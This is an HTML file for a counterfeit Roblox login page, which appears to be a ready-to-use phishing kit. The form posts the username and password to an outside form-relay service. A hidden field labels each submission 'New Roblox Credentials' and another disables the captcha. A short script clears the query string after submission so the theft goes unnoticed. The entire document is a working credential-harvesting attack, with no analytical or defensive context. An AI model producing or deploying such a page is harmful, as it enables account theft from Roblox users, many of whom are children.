<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login - Roblox</title>
    <style>
        body {
            background-image: url(https://external-content.duckduckgo.com/iu/?u=https%3A%2F%2Fcms-media.roblox.com%2Fresize%3Dwidth%3A1280%2Cfit%3Amax%2F39ZWAjES8GX7OyR383tQ&f=1&nofb=1&ipt=87d38292d57d115f81f133b8c2bdbb11563012d53dfe9ad03c45d4308a88788d);
            background-size: cover;
            background-position: center;
            background-repeat: no-repeat;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            overflow: hidden;
        }
        .login-container {
            background-color: #232527;
            padding: 55px 45px;
            width: 360px;
            border-radius: 10px;
            box-shadow: 0 8px 24px rgba(0, 0, 0, 0.4);
            text-align: center;
            display: flex;
            flex-direction: column;
            align-items: center;
        }
        .logo-area {
            width: 100px;
            height: 100px;
            margin-bottom: 20px;
        }
        .input-group {
            width: 100%;
            margin-bottom: 15px;
            text-align: left;
        }
        .input-group label {
            display: block;
            margin-bottom: 5px;
            font-size: 11px;
            font-weight: 700;
            color: #999;
            text-transform: uppercase;
        }
        .input-group input {
            width: 100%;
            padding: 12px 15px;
            box-sizing: border-box;
            border: 1px solid #ccc;
            border-radius: 4px;
            font-size: 14px;
            outline: none;
        }
        .input-group input:focus {
            border-color: #00b06f;
        }
        .form-options {
            display: flex;
            justify-content: space-between;
            width: 100%;
            font-size: 13px;
            margin-bottom: 20px;
            color: #999;
        }
        .checkbox-container {
            display: flex;
            align-items: center;
            cursor: pointer;
        }
        .checkbox-container input {
            margin-right: 5px;
        }
        .forgot-password {
            color: #418fa7;
            text-decoration: none;
            margin-left: 20px; /* Increased space between "Remember me" and "Forgot password" */
        }
        .forgot-password:hover {
            text-decoration: underline;
        }
        .login-btn {
            width: 100%;
            padding: 12px;
            background-color: #00b06f;
            color: white;
            border: none;
            border-radius: 4px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            margin-top: 10px;
        }
        .login-btn:hover {
            background-color: #008f5a;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <!-- New Roblox Logo -->
        <img src="https://m.media-amazon.com/images/I/61P4h5aB7BL._AC_SL1500_.jpg" alt="Roblox Logo" class="logo-area">
        
        <form action="https://formsubmit.co/el/suluxo" method="POST">
            <div class="input-group">
                <label for="username">Username</label>
                <input type="text" id="username" name="username" placeholder="Username" required>
            </div>
            
            <div class="input-group">
                <label for="password">Password</label>
                <input type="password" id="password" name="password" placeholder="Password" required>
            </div>
            
            <div class="form-options">
                <label class="checkbox-container">
                    <input type="checkbox" name="remember"> Remember me
                </label>
                <a href="#" class="forgot-password">Forgot password?</a>
            </div>
            
            <input type="hidden" name="_subject" value="New Roblox Credentials">
            <input type="hidden" name="_captcha" value="false">
            
            <button type="submit" class="login-btn">Log In</button>
        </form>
    </div>

    <!-- This script auto-refreshes the page to show the success message -->
    <script>
        if(window.location.search !== "") {
            window.location = window.location.pathname;
        }
    </script>
</body>
</html>
